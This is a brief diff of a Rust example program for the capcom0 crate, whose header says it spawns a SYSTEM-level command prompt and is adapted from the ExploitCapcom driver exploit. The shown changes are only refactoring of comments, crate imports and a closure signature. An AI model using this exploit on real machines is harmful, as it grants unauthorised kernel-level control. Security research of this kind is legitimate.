@@ -2,13 +2,10 @@
 Launch an elevated command prompt with NT AUTHORITY\SYSTEM privileges.
 
 Adapted from https://github.com/tandasat/ExploitCapcom
-*/
+ */
 
 // Only available to 64-bit windows targets.
 #![cfg(all(windows, target_pointer_width = "64"))]
-
-extern crate capcom0;
-extern crate winapi;
 
 use std::{mem, ptr};
 
@@ -42,7 +39,7 @@ macro_rules! get_system_routine_address {
 }
 
 fn main() {
-	let result = capcom0::setup(|device| {
+	let result = capcom0::setup(|_, device| {
 		let mut success = false;
 		unsafe {
 			#[allow(non_snake_case)]
